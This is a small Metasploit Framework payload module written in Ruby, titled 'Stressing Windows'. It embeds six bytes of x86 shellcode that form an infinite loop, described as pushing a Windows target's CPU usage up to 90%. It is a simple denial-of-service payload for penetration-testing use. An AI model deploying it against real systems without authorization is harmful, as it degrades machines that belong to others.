##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

###
#
# www.hatsecure.com/blog
#
###
module Metasploit4

	include Msf::Payload::Single

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Stressing Windows',
			'Version'       => '$Revision$',
			'Description'   => 'Pressing the CPU usage up to 90%',
			'Author'        => 'the.ne0z',
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Payload'       =>
				{
					'Payload' => "\x31\xc0\x40\x48\xeb\xfa"
				}
			))
	end

end
